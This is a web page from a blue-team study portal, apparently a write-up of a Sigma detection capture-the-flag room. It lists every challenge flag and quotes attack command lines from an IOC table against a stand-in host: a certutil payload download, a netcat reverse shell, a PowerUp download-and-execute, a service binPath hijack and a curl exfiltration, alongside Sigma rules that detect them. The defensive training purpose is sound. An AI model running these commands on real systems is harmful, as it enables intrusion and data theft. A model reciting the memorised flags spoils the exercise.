@@ -1,0 +1,315 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="dark">
+  <title>SigHunt | Blue Team Study Portal</title>
+  <link rel="stylesheet" href="../style.css">
+</head>
+<body class="min-h-screen bg-slate-950 text-slate-100 antialiased">
+  <div class="app-shell">
+    <aside class="sidebar">
+    <a class="brand" href="../index.html"><span>BT</span><strong>Blue Team Study Portal</strong></a>
+    <button class="command-button" type="button" id="openCommand">Search / Quick jump <kbd>Ctrl K</kbd></button>
+    <label class="search-box"><span>Search notes</span><input id="globalSearch" type="search" placeholder="Search MITRE, commands, topics"></label>
+    <div id="searchResults" class="search-results" hidden></div>
+    <nav><details class="side-level" open><summary><strong>L1</strong><span>Initial Triage &amp; Fundamentals</span></summary><details class="side-section"><summary>SOC &amp; Incident Response Basics<span>5</span></summary><a class="side-link " href="../pages/soc-essentials.html"><span>SOC Essentials</span><em>0 nodes</em></a><a class="side-link " href="../pages/what-is-incident-response.html"><span>What is Incident Response?</span><em>0 nodes</em></a><a class="side-link " href="../pages/incident-response-cycle.html"><span>Incident Response Cycle</span><em>0 nodes</em></a><a class="side-link " href="../pages/frameworks.html"><span>Frameworks</span><em>5 nodes</em></a><a class="side-link " href="../pages/the-hive.html"><span>The Hive</span><em>0 nodes</em></a></details><details class="side-section"><summary>Operating System &amp; Command Line Basics<span>4</span></summary><a class="side-link " href="../pages/important-windows-directories.html"><span>Important Windows Directories</span><em>0 nodes</em></a><a class="side-link " href="../pages/windows-command-line-tools.html"><span>Windows command-line &amp; tools</span><em>0 nodes</em></a><a class="side-link " href="../pages/intro-to-powershell.html"><span>Intro to PowerShell</span><em>0 nodes</em></a><a class="side-link " href="../pages/linux-cheatsheet.html"><span>Linux CheatSheet</span><em>0 nodes</em></a></details><details class="side-section"><summary>Networking &amp; Web Basics<span>3</span></summary><a class="side-link " href="../pages/network.html"><span>Network</span><em>4 nodes</em></a><a class="side-link " href="../pages/network-defenses.html"><span>Network Defenses</span><em>0 nodes</em></a><a class="side-link " href="../pages/web-fundamentals.html"><span>Web Fundamentals</span><em>0 nodes</em></a></details><details class="side-section"><summary>Initial Triage &amp; Analysis<span>3</span></summary><a class="side-link " href="../pages/phishing-analysis.html"><span>Phishing analysis</span><em>14 nodes</em></a><a class="side-link " href="../pages/phishing-analysis-labs.html"><span>Phishing Analysis Labs</span><em>13 nodes</em></a><a class="side-link " href="../pages/osint.html"><span>OSINT</span><em>0 nodes</em></a></details><details class="side-section"><summary>Tool Familiarity<span>3</span></summary><a class="side-link " href="../pages/logging-fundamentals.html"><span>Logging Fundamentals</span><em>0 nodes</em></a><a class="side-link " href="../pages/siem.html"><span>SIEM</span><em>0 nodes</em></a><a class="side-link " href="../pages/elk-elastic-stack.html"><span>ELK (Elastic Stack)</span><em>0 nodes</em></a></details></details><details class="side-level" ><summary><strong>L1.5</strong><span>Advanced Investigation &amp; Contextualization</span></summary><details class="side-section"><summary>Endpoint &amp; OS Investigation<span>5</span></summary><a class="side-link " href="../pages/windows-event-ids.html"><span>Windows Event IDs</span><em>9 nodes</em></a><a class="side-link " href="../pages/windows-processes.html"><span>Windows processes</span><em>0 nodes</em></a><a class="side-link " href="../pages/windows-security-monitoring.html"><span>Windows Security Monitoring</span><em>4 nodes</em></a><a class="side-link " href="../pages/sysinternals.html"><span>Sysinternals</span><em>0 nodes</em></a><a class="side-link " href="../pages/edr-endpoint-detection-and-response.html"><span>EDR (Endpoint Detection and Response)</span><em>0 nodes</em></a></details><details class="side-section"><summary>Advanced Querying<span>4</span></summary><a class="side-link " href="../pages/splunk.html"><span>Splunk</span><em>0 nodes</em></a><a class="side-link " href="../pages/splunk-filters.html"><span>Splunk Filters</span><em>0 nodes</em></a><a class="side-link " href="../pages/log-analysis-labs.html"><span>Log Analysis Labs</span><em>15 nodes</em></a><a class="side-link " href="../pages/regex.html"><span>Regex</span><em>0 nodes</em></a></details><details class="side-section"><summary>Contextualizing Threats<span>3</span></summary><a class="side-link " href="../pages/threat-intelligence.html"><span>Threat Intelligence</span><em>6 nodes</em></a><a class="side-link " href="../pages/threat-intelligence-labs.html"><span>Threat Intelligence Labs</span><em>18 nodes</em></a><a class="side-link " href="../pages/threat-intelligence-toolkit.html"><span>Threat Intelligence Toolkit</span><em>1 nodes</em></a></details><details class="side-section"><summary>Network Investigation<span>1</span></summary><a class="side-link " href="../pages/network-analysis-tools.html"><span>Network Analysis Tools</span><em>3 nodes</em></a></details></details><details class="side-level" ><summary><strong>L2</strong><span>DFIR, Threat Hunting &amp; Engineering</span></summary><details class="side-section"><summary>Proactive Threat Hunting<span>6</span></summary><a class="side-link " href="../pages/hunting-persistence-mitre-ta0003.html"><span>Hunting Persistence (MITRE TA0003)</span><em>11 nodes</em></a><a class="side-link " href="../pages/hunting-lateral-movement-mitre-ta0008.html"><span>Hunting Lateral Movement (MITRE TA0008)</span><em>4 nodes</em></a><a class="side-link " href="../pages/hunting-discovery-mitre-ta0007.html"><span>Hunting Discovery (MITRE TA0007)</span><em>0 nodes</em></a><a class="side-link " href="../pages/threat-hunting-module.html"><span>Threat Hunting module</span><em>6 nodes</em></a><a class="side-link " href="../pages/threat-hunting-labs-siem.html"><span>Threat hunting Labs (SIEM)</span><em>27 nodes</em></a><a class="side-link " href="../pages/100-splunk-use-cases.html"><span>+100 Splunk Use Cases</span><em>0 nodes</em></a></details><details class="side-section"><summary>Digital Forensics (DFIR)<span>8</span></summary><a class="side-link " href="../pages/digital-forensics.html"><span>Digital Forensics</span><em>9 nodes</em></a><a class="side-link " href="../pages/windows-forensics.html"><span>Windows Forensics</span><em>22 nodes</em></a><a class="side-link " href="../pages/forensics-labs.html"><span>Forensics Labs</span><em>15 nodes</em></a><a class="side-link " href="../pages/memory-forensics.html"><span>Memory forensics</span><em>0 nodes</em></a><a class="side-link " href="../pages/memory-forensics-labs.html"><span>Memory Forensics Labs</span><em>19 nodes</em></a><a class="side-link " href="../pages/volatility.html"><span>Volatility</span><em>5 nodes</em></a><a class="side-link " href="../pages/linux-artifacts-forensic-evidence-collection.html"><span>Linux Artifacts &amp; Forensic Evidence Collection</span><em>7 nodes</em></a><a class="side-link " href="../pages/stenography.html"><span>Stenography</span><em>0 nodes</em></a></details><details class="side-section"><summary>Advanced Attack Vectors &amp; Internals<span>9</span></summary><a class="side-link " href="../pages/active-directory.html"><span>Active Directory</span><em>7 nodes</em></a><a class="side-link " href="../pages/kerberos-authentication.html"><span>Kerberos authentication</span><em>0 nodes</em></a><a class="side-link " href="../pages/detecting-ad-attacks.html"><span>Detecting AD Attacks</span><em>15 nodes</em></a><a class="side-link " href="../pages/detecting-active-directory-attacks-htb.html"><span>Detecting Active Directory Attacks / HTB</span><em>6 nodes</em></a><a class="side-link " href="../pages/windows-internals.html"><span>Windows Internals</span><em>0 nodes</em></a><a class="side-link " href="../pages/command-and-control.html"><span>Command-and-Control (C2)</span><em>0 nodes</em></a><a class="side-link " href="../pages/command-and-control-c2-evasion-techniques.html"><span>Command-and-Control (C2) Evasion Techniques</span><em>0 nodes</em></a><a class="side-link " href="../pages/detecting-web-attacks.html"><span>Detecting Web Attacks</span><em>8 nodes</em></a><a class="side-link " href="../pages/network-analysis-labs.html"><span>Network Analysis Labs</span><em>28 nodes</em></a></details><details class="side-section"><summary>Detection Engineering &amp; Automation<span>6</span></summary><a class="side-link " href="../pages/detection-engineering.html"><span>Detection Engineering</span><em>0 nodes</em></a><a class="side-link " href="../pages/sigma.html"><span>Sigma</span><em>0 nodes</em></a><a class="side-link " href="../pages/yara.html"><span>Yara</span><em>0 nodes</em></a><a class="side-link " href="../pages/atomic-red-team.html"><span>Atomic Red Team</span><em>0 nodes</em></a><a class="side-link " href="../pages/threat-modelling.html"><span>Threat Modelling</span><em>5 nodes</em></a><a class="side-link " href="../pages/ad-hardening.html"><span>AD Hardening</span><em>0 nodes</em></a></details><details class="side-section"><summary>Advanced Scripting &amp; Analysis Tooling<span>6</span></summary><a class="side-link " href="../pages/powershell-for-incident-response.html"><span>PowerShell for Incident Response</span><em>0 nodes</em></a><a class="side-link " href="../pages/powershell-detection.html"><span>Powershell Detection</span><em>0 nodes</em></a><a class="side-link " href="../pages/powershell-logs.html"><span>PowerShell Logs</span><em>0 nodes</em></a><a class="side-link " href="../pages/lolbins-living-off-the-land-binaries.html"><span>LOLBins (living-off-the-land binaries)</span><em>0 nodes</em></a><a class="side-link " href="../pages/osquery.html"><span>Osquery</span><em>0 nodes</em></a><a class="side-link " href="../pages/cryptography.html"><span>Cryptography</span><em>0 nodes</em></a></details></details></nav>
+  </aside>
+    <main class="content"><header class="topic-hero">
+      <div class="breadcrumbs"><a href="../index.html">Home</a><span>/</span><a href="sigma-0592b140.html">Sigma</a><span>/</span><span>SigHunt</span></div>
+      <h1>SigHunt</h1>
+      <p>You are hired as a Detection Engineer for your organization. During your first week, a ransomware incident has just concluded, and the Incident Responders of your organization have successfully mitigated the threat. With their collective effort, the Incident Response (IR) Team provided the IOCs based on their investigation. Your task is to create Sigma rules</p>
+      <div class="tag-row"><span class="tag level">L1.5</span><span class="tag">PowerShell</span><span class="tag">Windows</span><span class="tag">Sysmon</span><span class="tag">Phishing</span><span class="tag">Web</span><span class="tag">Detection</span><span class="tag">Incident Response</span><span class="tag">Persistence</span><span class="tag">Sigma</span><span class="tag mitre">T1110</span></div>
+    </header>
+    <div class="reader-layout">
+      <aside class="secondary-nav">
+        <div class="secondary-heading"><span>Current Tree</span><strong>Sigma</strong></div>
+        <details class="tree-node" open>
+    <summary>
+      <a class="" href="sigma-0592b140.html"><span>Sigma</span><em>L1</em></a>
+      <b>2</b>
+    </summary>
+    <div class="tree-children"><details class="tree-node" open>
+    <summary>
+      <a class="" href="sigma.html"><span>Sigma</span><em>L2</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="active" href="sighunt.html"><span>SigHunt</span><em>L1.5</em></a>
+      
+    </summary>
+    
+  </details></div>
+  </details>
+      </aside>
+      <article class="reader">
+        
+        <section class="study-grid">
+    <article><h2>Overview</h2><p>You are hired as a Detection Engineer for your organization. During your first week, a ransomware incident has just concluded, and the Incident Responders of your organization have successfully mitigated the threat. With their collective effort, the Incident Response (IR) Team provided the IOCs based on their investigation. Your task is to create Sigma rules</p></article>
+    <article><h2>Why It Matters In SOC</h2><p>Use this note as an analyst reference: understand the concept, identify the relevant telemetry, pivot through evidence, and document the decision path clearly.</p></article>
+    <article><h2>Key Concepts</h2><ul><li>SigHunt</li><li>Scenario</li><li>Indicators of Compromise</li><li>Rule Creation Standards</li><li>1- What is the Challenge 1 flag?</li><li>THM{ph1sh1ngmsht4101}</li><li>2- What is the Challenge 2 flag?</li><li>THM{n0tjust4c3rts}</li><li>3- What is the Challenge 3 flag?</li><li>THM{cl4ss1cn3tc4tr3vs}</li><li>4- What is the Challenge 4 flag?</li><li>THM{p0wp0wp0w3rup3num}</li></ul></article>
+    <article><h2>Analyst Workflow</h2><ul><li>Identify the user, host, process, network flow, or identity object involved.</li><li>Collect the highest-value logs first and preserve timestamps and assumptions.</li><li>Pivot through related notes, telemetry sources, and MITRE references.</li><li>Document findings, gaps, containment options, and detection improvements.</li></ul></article>
+    <article><h2>Splunk/SIEM Examples</h2><p class="muted">No direct examples extracted.</p></article>
+    <article><h2>Important Commands</h2><div class="code-shell"><div class="code-bar"><span>yaml</span><button class="copy-code" type="button">Copy</button></div><pre><code>title: Malicious mshta
+id: #Universally Unique Identifier (UUID) Generate one from https://www.uuidgenerator.net
+status: #stage of your rule testing 
+description: Detects the usage of Malicious HTML Application
+author: mama mia albertooooo 
+date: #When was the rule written.
+modified: #When was it updated
+logsource:
+  product: windows
+  service: sysmon
+detection:
+  selection:
+     EventID: 1 #Search identifiers for the detection. Refer to the required fields provided in the task. 
+     Image: C:\Windows\SysWOW64\mshta.exe
+     ParentImage: C:\Program Files\Google\Chrome\Application\chrome.exe
+  condition: selection #Action to be taken. Can use condition operators such as OR, AND, NOT, 
+fields: #List of associated fields that are important for the detection
+
+falsepositives: #Any possible false positives that could trigger the rule.
+
+level: medium #Severity level of the detection rule.
+tags: #Associated TTPs from MITRE ATT&amp;CK
+  - attack.credential_access #MITRE Tactic
+  - attack.t1110 #MITRE Technique</code></pre></div><div class="code-shell"><div class="code-bar"><span>yaml</span><button class="copy-code" type="button">Copy</button></div><pre><code>detection:
+  selection1:
+    EventID: 1
+    Image|contains: 'powershell.exe'
+    CommandLine|contains|all:
+      - 'downloadstring'
+      - 'powershell'
+      - 'Invoke-AllChecks'
+      - 'new-object net.webclient'
+
+  condition: selection1</code></pre></div><div class="code-shell"><div class="code-bar"><span>yaml</span><button class="copy-code" type="button">Copy</button></div><pre><code>detection:
+  selection:
+    EventID: 1
+    Image|contains:
+      - 'reg.exe'
+    CommandLine|contains|all:
+      - ' add '
+      - 'RunOnce'
+
+  condition: selection</code></pre></div><div class="code-shell"><div class="code-bar"><span>yaml</span><button class="copy-code" type="button">Copy</button></div><pre><code>detection:
+  selection:
+    EventID: 1
+    Image|endswith: '\curl.exe'
+    CommandLine|contains|all:
+      - '.zip'
+      - 'curl'
+      - ' -d '
+
+  condition: selection</code></pre></div></article>
+    <article><h2>Tools Used</h2><ul><li>Sysmon</li><li>PowerShell</li><li>Sigma</li></ul></article>
+    <article><h2>Notes/Tips</h2><p class="muted">No extracted items for this section.</p></article>
+  </section>
+        <section class="source-note"><h2>Original Notes</h2><h2 id="sighunt">SigHunt</h2>
+<h3 id="scenario">Scenario</h3>
+<p><strong>You are hired as a Detection Engineer for your organization. During your first week, a ransomware incident has just concluded, and the Incident Responders of your organization have successfully mitigated the threat. With their collective effort, the Incident Response (IR) Team provided the IOCs based on their investigation. Your task is to create Sigma rules to improve the detection capabilities of your organization and prevent future incidents similar to this.</strong></p>
+<h4 id="indicators-of-compromise">Indicators of Compromise</h4>
+<p>Based on the given incident report, the Incident Responders discovered the following attack chain:</p>
+<ul>
+<li>Execution of malicious HTA payload from a phishing link.</li>
+<li>Execution of Certutil tool to download Netcat binary.</li>
+<li>Netcat execution to establish a reverse shell.</li>
+<li>Enumeration of privilege escalation vectors through PowerUp.ps1.</li>
+<li>Abused service modification privileges to achieve System privileges.</li>
+<li>Collected sensitive data by archiving via 7-zip.</li>
+<li>Exfiltrated sensitive data through <strong>cURL</strong> binary.</li>
+<li>Executed ransomware with <strong>huntme</strong> as the file extension.</li>
+</ul>
+<p>In addition, the Incident Responders provided a table of IOCs at your disposal.</p>
+<div class="table-wrap"><table><thead><tr><th>Attack Technique</th><th>Indicators of Compromise</th></tr></thead><tbody></tbody></table></div>
+<p>| HTA payload | Parent Image: chrome.exe Image: mshta.exe Command Line: C:\Windows\SysWOW64\mshta.exe C:\Users\victim\Downloads\update.hta | | Certutil Download | Image: certutil.exe Command Line: certutil -urlcache -split -f http://huntmeplz.com/ransom.exe ransom.exe | | Netcat Reverse Shell | Image: nc.exe Command Line: C:\Users\victim\AppData\Local\Temp\nc.exe huntmeplz.com 4444 -e cmd.exe MD5 Hash: 523613A7B9DFA398CBD5EBD2DD0F4F38 | | PowerUp Enumeration | Image: powershell.exe Command Line: powershell &quot;iex(new-object net.webclient).downloadstring('http://huntmeplz.com/PowerUp.ps1'); Invoke-AllChecks;&quot; | | Service Binary Modification | Image: sc.exe Command Line: sc.exe config SNMPTRAP binPath= &quot;C:\Users\victim\AppData\Local\Temp\rev.exe huntmeplz.com 4443 -e cmd.exe&quot; | | RunOnce Persistence | Image: reg.exe Command Line: reg add &quot;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce&quot; /v MicrosoftUpdate /t REG_SZ /d &quot;C:\Windows\System32\cmdd.exe&quot; | | 7-zip Collection | Image: 7z.exe Command Line: 7z a exfil.zip <em> -p | | cURL Exfiltration | Image: curl.exe Command Line: curl -d @exfil.zip http://huntmeplz.com:8080/ | | Ransomware File Encryption | Image: ransom.exe Target Filename: </em>.huntme |</p>
+<h4 id="rule-creation-standards">Rule Creation Standards</h4>
+<p>The Detection Engineering Team follows a standard when creating a Sigma Rule. You may refer to the guidelines below.</p>
+<div class="table-wrap"><table><thead><tr><th>Attack Technique</th><th>Required Detection Fields</th></tr></thead><tbody></tbody></table></div>
+<p>| HTA payload | • EventID • ParentImage • Image | | Certutil Download | • EventID • Image • CommandLine | | Netcat Reverse Shell | • EventID • Image • CommandLine • Hashes | | PowerUp Enumeration | • EventID • Image • CommandLine | | Service Binary Modification | • EventID • Image • CommandLine | | RunOnce Persistence | • EventID • Image • CommandLine | | 7-zip Collection | • EventID • Image • CommandLine | | cURL Exfiltration | • EventID • Image • CommandLine | | Ransomware File Encryption | • EventID • TargetFilename |</p>
+<p><a class="note-link" href="https://tryhackme.com/room/sighunt">https://tryhackme.com/room/sighunt</a></p>
+<hr>
+<p>so we have this interface where we will submit the sigma rule for each technique and get the flag</p>
+<p><button class="image-button" data-src="../assets/images/sigmasighunt-screenshot_2025-07-11_200848-65bd8ed8.png" data-alt="Screenshot 2025-07-11 200848.png"><img src="../assets/images/sigmasighunt-screenshot_2025-07-11_200848-65bd8ed8.png" alt="Screenshot 2025-07-11 200848.png" loading="lazy"></button></p>
+<p><strong>Run</strong> : Submit your Sigma rule and see if it detects the malicious IOC.</p>
+<p><strong>Text Editor :</strong> Write your Sigma rule in this section.</p>
+<p><strong>Create Rule :</strong> Create a Sigma rule for the malicious IOC.</p>
+<p><strong>View Log :</strong>  View the log details associated with the malicious IOC.</p>
+<hr>
+<p>so for each technique we look at the table above about the required detection fields and copy them from the log we have to the detection field and that's it  we can leave the rest but for best practice change them all</p>
+<h4 id="1-what-is-the-challenge-1-flag">1- What is the Challenge #1 flag?</h4>
+<h4 id="thmph1sh1ngmsht4101">THM{ph1sh1ng_msht4_101}</h4>
+<p><button class="image-button" data-src="../assets/images/sigmasighunt-screenshot_2025-07-11_201352-4c437c08.png" data-alt="Screenshot 2025-07-11 201352.png"><img src="../assets/images/sigmasighunt-screenshot_2025-07-11_201352-4c437c08.png" alt="Screenshot 2025-07-11 201352.png" loading="lazy"></button></p>
+<p><button class="image-button" data-src="../assets/images/sigmasighunt-screenshot_2025-07-11_201739-e78d268f.png" data-alt="Screenshot 2025-07-11 201739.png"><img src="../assets/images/sigmasighunt-screenshot_2025-07-11_201739-e78d268f.png" alt="Screenshot 2025-07-11 201739.png" loading="lazy"></button></p>
+<div class="code-shell"><div class="code-bar"><span>yaml</span><button class="copy-code" type="button">Copy</button></div><pre><code class="language-yaml">title: Malicious mshta
+id: #Universally Unique Identifier (UUID) Generate one from https://www.uuidgenerator.net
+status: #stage of your rule testing 
+description: Detects the usage of Malicious HTML Application
+author: mama mia albertooooo 
+date: #When was the rule written.
+modified: #When was it updated
+logsource:
+  product: windows
+  service: sysmon
+detection:
+  selection:
+     EventID: 1 #Search identifiers for the detection. Refer to the required fields provided in the task. 
+     Image: C:\Windows\SysWOW64\mshta.exe
+     ParentImage: C:\Program Files\Google\Chrome\Application\chrome.exe
+  condition: selection #Action to be taken. Can use condition operators such as OR, AND, NOT, 
+fields: #List of associated fields that are important for the detection
+
+falsepositives: #Any possible false positives that could trigger the rule.
+
+level: medium #Severity level of the detection rule.
+tags: #Associated TTPs from MITRE ATT&amp;CK
+  - attack.credential_access #MITRE Tactic
+  - attack.t1110 #MITRE Technique</code></pre></div>
+<h4 id="2-what-is-the-challenge-2-flag">2- What is the Challenge #2 flag?</h4>
+<h4 id="thmn0tjust4c3rts">THM{n0t_just_4_c3rts}</h4>
+<p><button class="image-button" data-src="../assets/images/sigmasighunt-screenshot_2025-07-11_202253-0edd3c88.png" data-alt="Screenshot 2025-07-11 202253.png"><img src="../assets/images/sigmasighunt-screenshot_2025-07-11_202253-0edd3c88.png" alt="Screenshot 2025-07-11 202253.png" loading="lazy"></button></p>
+<p><button class="image-button" data-src="../assets/images/sigmasighunt-screenshot_2025-07-11_204042-0a65d48e.png" data-alt="Screenshot 2025-07-11 204042.png"><img src="../assets/images/sigmasighunt-screenshot_2025-07-11_204042-0a65d48e.png" alt="Screenshot 2025-07-11 204042.png" loading="lazy"></button></p>
+<div class="code-shell"><div class="code-bar"><span>yaml</span><button class="copy-code" type="button">Copy</button></div><pre><code class="language-yaml">title: &quot;Certutil URLCache File Download&quot;
+id: &quot;f47ac10b-58cc-4372-a567-0e02b2c3d479&quot;
+status: experimental
+description: &quot;Detects usage of certutil with flags to download files via -urlcache and -split.&quot;
+author: &quot;Omar Amir&quot;
+date: 2025-07-11
+modified: 2025-07-11
+
+logsource:
+  product: windows
+  service: sysmon
+
+detection:
+  selection:
+    EventID: 1
+    Image|endswith: 'certutil.exe'
+    CommandLine|contains:
+      - '-urlcache'
+      - '-split'
+      - '-f'
+  condition: selection
+
+fields:
+  - CommandLine
+  - Image
+
+falsepositives:
+  - Legitimate admin use of certutil to fetch internal tools
+
+level: medium
+
+tags:
+  - attack.credential_access
+  - attack.t1110</code></pre></div>
+<h4 id="3-what-is-the-challenge-3-flag">3- What is the Challenge #3 flag?</h4>
+<h4 id="thmcl4ss1cn3tc4tr3vs">THM{cl4ss1c_n3tc4t_r3vs}</h4>
+<p><button class="image-button" data-src="../assets/images/sigmasighunt-screenshot_2025-07-11_202308-e0240206.png" data-alt="Screenshot 2025-07-11 202308.png"><img src="../assets/images/sigmasighunt-screenshot_2025-07-11_202308-e0240206.png" alt="Screenshot 2025-07-11 202308.png" loading="lazy"></button></p>
+<div class="code-shell"><div class="code-bar"><span>yaml</span><button class="copy-code" type="button">Copy</button></div><pre><code class="language-yaml">detection:
+  selection1:
+    EventID: 1
+    Image|endswith: 'nc.exe'
+    CommandLine|contains|all:
+      - ' -e '
+
+  selection2:
+    Hashes|contains: '523613A7B9DFA398CBD5EBD2DD0F4F38'
+
+  condition: selection1 or selection2</code></pre></div>
+<h4 id="4-what-is-the-challenge-4-flag">4- What is the Challenge #4 flag?</h4>
+<h4 id="thmp0wp0wp0w3rup3num">THM{p0wp0wp0w3rup_3num}</h4>
+<p><button class="image-button" data-src="../assets/images/sigmasighunt-screenshot_2025-07-11_202321-094b2326.png" data-alt="Screenshot 2025-07-11 202321.png"><img src="../assets/images/sigmasighunt-screenshot_2025-07-11_202321-094b2326.png" alt="Screenshot 2025-07-11 202321.png" loading="lazy"></button></p>
+<div class="code-shell"><div class="code-bar"><span>yaml</span><button class="copy-code" type="button">Copy</button></div><pre><code class="language-yaml">detection:
+  selection1:
+    EventID: 1
+    Image|contains: 'powershell.exe'
+    CommandLine|contains|all:
+      - 'downloadstring'
+      - 'powershell'
+      - 'Invoke-AllChecks'
+      - 'new-object net.webclient'
+
+  condition: selection1</code></pre></div>
+<h4 id="5-what-is-the-challenge-5-flag">5- What is the Challenge #5 flag?</h4>
+<h4 id="thmov3rpr1v1l3g3ds3rv1c3">THM{ov3rpr1v1l3g3d_s3rv1c3}</h4>
+<p><button class="image-button" data-src="../assets/images/sigmasighunt-screenshot_2025-07-11_202333-f6feec7e.png" data-alt="Screenshot 2025-07-11 202333.png"><img src="../assets/images/sigmasighunt-screenshot_2025-07-11_202333-f6feec7e.png" alt="Screenshot 2025-07-11 202333.png" loading="lazy"></button></p>
+<div class="code-shell"><div class="code-bar"><span>yaml</span><button class="copy-code" type="button">Copy</button></div><pre><code class="language-yaml">detection:
+  selection:
+    EventID: 1
+    Image|contains: 'sc.exe'
+    CommandLine|contains|all:
+      - ' binPath= '
+      - 'sc.exe'
+      - ' config '
+      - '-e'
+
+  condition: selection</code></pre></div>
+<h4 id="6-what-is-the-challenge-6-flag">6- What is the Challenge #6 flag?</h4>
+<h4 id="thmh1d3m31nrun0nc3">THM{h1d3_m3_1n_run0nc3}</h4>
+<p><button class="image-button" data-src="../assets/images/sigmasighunt-screenshot_2025-07-11_202343-dbf3b805.png" data-alt="Screenshot 2025-07-11 202343.png"><img src="../assets/images/sigmasighunt-screenshot_2025-07-11_202343-dbf3b805.png" alt="Screenshot 2025-07-11 202343.png" loading="lazy"></button></p>
+<div class="code-shell"><div class="code-bar"><span>yaml</span><button class="copy-code" type="button">Copy</button></div><pre><code class="language-yaml">detection:
+  selection:
+    EventID: 1
+    Image|contains:
+      - 'reg.exe'
+    CommandLine|contains|all:
+      - ' add '
+      - 'RunOnce'
+
+  condition: selection</code></pre></div>
+<h4 id="7-what-is-the-challenge-7-flag">7- What is the Challenge #7 flag?</h4>
+<h4 id="thmc0ll3ct1ng7zftw">THM{c0ll3ct1ng_7z_ftw}</h4>
+<p><button class="image-button" data-src="../assets/images/sigmasighunt-screenshot_2025-07-11_202351-b1e6405b.png" data-alt="Screenshot 2025-07-11 202351.png"><img src="../assets/images/sigmasighunt-screenshot_2025-07-11_202351-b1e6405b.png" alt="Screenshot 2025-07-11 202351.png" loading="lazy"></button></p>
+<div class="code-shell"><div class="code-bar"><span>yaml</span><button class="copy-code" type="button">Copy</button></div><pre><code class="language-yaml">detection:
+  selection:
+    EventID: 1
+    Image|endswith: '\7z.exe'
+    CommandLine|contains|all:
+      - ' a '
+      - '-p'
+
+  condition: selection</code></pre></div>
+<h4 id="8-what-is-the-challenge-8-flag">8- What is the Challenge #8 flag?</h4>
+<h4 id="thmcurling0nw1nd0ws">THM{cUrling_0n_w1nd0ws}</h4>
+<p><button class="image-button" data-src="../assets/images/sigmasighunt-screenshot_2025-07-11_202359-c2020c06.png" data-alt="Screenshot 2025-07-11 202359.png"><img src="../assets/images/sigmasighunt-screenshot_2025-07-11_202359-c2020c06.png" alt="Screenshot 2025-07-11 202359.png" loading="lazy"></button></p>
+<div class="code-shell"><div class="code-bar"><span>yaml</span><button class="copy-code" type="button">Copy</button></div><pre><code class="language-yaml">detection:
+  selection:
+    EventID: 1
+    Image|endswith: '\curl.exe'
+    CommandLine|contains|all:
+      - '.zip'
+      - 'curl'
+      - ' -d '
+
+  condition: selection</code></pre></div>
+<h4 id="9-what-is-the-challenge-9-flag">9- What is the Challenge #9 flag?</h4>
+<h4 id="thmhuntm3pl34s3">THM{huntm3_pl34s3}</h4>
+<p><button class="image-button" data-src="../assets/images/sigmasighunt-screenshot_2025-07-11_202407-2291a88d.png" data-alt="Screenshot 2025-07-11 202407.png"><img src="../assets/images/sigmasighunt-screenshot_2025-07-11_202407-2291a88d.png" alt="Screenshot 2025-07-11 202407.png" loading="lazy"></button></p>
+<div class="code-shell"><div class="code-bar"><span>yaml</span><button class="copy-code" type="button">Copy</button></div><pre><code class="language-yaml">detection:
+  selection:
+    EventID: 11
+    TargetFilename: '*.huntme'
+  condition: selection</code></pre></div>
+<p><button class="image-button" data-src="../assets/images/sigmasighunt-image-19f82124.png" data-alt="image.png"><img src="../assets/images/sigmasighunt-image-19f82124.png" alt="image.png" loading="lazy"></button></p></section>
+      </article>
+      <details class="toc" open><summary>Table of contents</summary><a href="#sighunt">SigHunt</a><a href="#scenario">Scenario</a><a href="#indicators-of-compromise">Indicators of Compromise</a><a href="#rule-creation-standards">Rule Creation Standards</a><a href="#1-what-is-the-challenge-1-flag">1- What is the Challenge 1 flag?</a><a href="#thmph1sh1ngmsht4101">THM{ph1sh1ngmsht4101}</a><a href="#2-what-is-the-challenge-2-flag">2- What is the Challenge 2 flag?</a><a href="#thmn0tjust4c3rts">THM{n0tjust4c3rts}</a><a href="#3-what-is-the-challenge-3-flag">3- What is the Challenge 3 flag?</a><a href="#thmcl4ss1cn3tc4tr3vs">THM{cl4ss1cn3tc4tr3vs}</a><a href="#4-what-is-the-challenge-4-flag">4- What is the Challenge 4 flag?</a><a href="#thmp0wp0wp0w3rup3num">THM{p0wp0wp0w3rup3num}</a><a href="#5-what-is-the-challenge-5-flag">5- What is the Challenge 5 flag?</a><a href="#thmov3rpr1v1l3g3ds3rv1c3">THM{ov3rpr1v1l3g3ds3rv1c3}</a><a href="#6-what-is-the-challenge-6-flag">6- What is the Challenge 6 flag?</a><a href="#thmh1d3m31nrun0nc3">THM{h1d3m31nrun0nc3}</a><a href="#7-what-is-the-challenge-7-flag">7- What is the Challenge 7 flag?</a><a href="#thmc0ll3ct1ng7zftw">THM{c0ll3ct1ng7zftw}</a><a href="#8-what-is-the-challenge-8-flag">8- What is the Challenge 8 flag?</a><a href="#thmcurling0nw1nd0ws">THM{cUrling0nw1nd0ws}</a><a href="#9-what-is-the-challenge-9-flag">9- What is the Challenge 9 flag?</a><a href="#thmhuntm3pl34s3">THM{huntm3pl34s3}</a></details>
+    </div>
+    
+    <footer class="pager"><a href="sigma.html">← Sigma</a><a href="yara.html">Yara →</a></footer></main>
+  </div>
+  <div class="lightbox" id="lightbox" hidden><button type="button" aria-label="Close image">×</button><img alt=""></div>
+  <div class="command-palette" id="commandPalette" hidden>
+    <div class="command-panel">
+      <div class="command-head"><strong>Quick jump</strong><button type="button" id="closeCommand">Close</button></div>
+      <input id="commandInput" type="search" placeholder="Search any note, tag, command, or MITRE ID">
+      <div id="commandResults" class="command-results"></div>
+    </div>
+  </div>
+  <script src="../data/json/search-index.js"></script>
+  <script src="../script.js"></script>
+</body>
+</html>
